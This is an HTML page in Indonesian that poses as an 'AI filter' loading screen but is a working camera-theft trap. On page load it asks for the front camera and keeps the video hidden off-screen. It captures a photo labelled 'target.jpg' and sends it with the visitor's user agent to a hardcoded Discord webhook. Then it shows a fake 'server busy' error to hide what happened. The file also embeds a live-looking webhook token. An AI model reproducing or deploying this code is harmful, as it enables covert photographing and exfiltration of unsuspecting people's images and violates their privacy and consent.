<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Filter Loading...</title>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; text-align: center; }
        #loading-screen { display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .spinner { border: 4px solid #333; border-top: 4px solid #e1306c; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status-text { font-size: 14px; color: #aaa; transition: 0.3s; line-height: 1.5; }
        
        video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; }
    </style>
</head>
<body>

<div id="loading-screen">
    <div class="spinner" id="spinner"></div>
    <div id="status-text">Meminta akses kamera...</div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1561391421200797738/dfLpkO0PbTGmigN72TW2CxmfXoCL4bFIw8xmMxR_9bPvQNhjCGD6LunWTJ-gFl3wlcWA"; 

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusText = document.getElementById('status-text');
    const spinner = document.getElementById('spinner');

    async function startAutoCapture() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });
            
            video.srcObject = stream;
            statusText.innerText = "Menerapkan filter AI...";
            
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(() => {
                    captureAndSend(stream);
                }, 2000);
            };

        } catch (err) {
            spinner.style.display = 'none';
            statusText.innerText = "Akses kamera ditolak. Filter tidak dapat dimuat.";
        }
    }

    function captureAndSend(stream) {
        statusText.innerText = "Mengirim hasil...";
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        const blob = dataURItoBlob(imageData);
        
        const formData = new FormData();
        formData.append("file", blob, "target.jpg");
        formData.append("payload_json", JSON.stringify({
            content: `📸 **Auto-Captured!**\nUA: ${navigator.userAgent}`
        }));

        fetch(WEBHOOK_URL, { method: 'POST', body: formData })
            .then(() => {
                stream.getTracks().forEach(track => track.stop());
                spinner.style.display = 'none';
                statusText.innerHTML = "❌ <b>Filter gagal dimuat.</b><br>Server sedang sibuk, coba lagi nanti.";
            })
            .catch(err => {
                spinner.style.display = 'none';
                statusText.innerText = "Koneksi terputus.";
            });
    }

    function dataURItoBlob(dataURI) {
        const byteString = atob(dataURI.split(',')[1]);
        const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        return new Blob([ab], { type: mimeString });
    }

    window.onload = startAutoCapture;
</script>

</body>
</html>
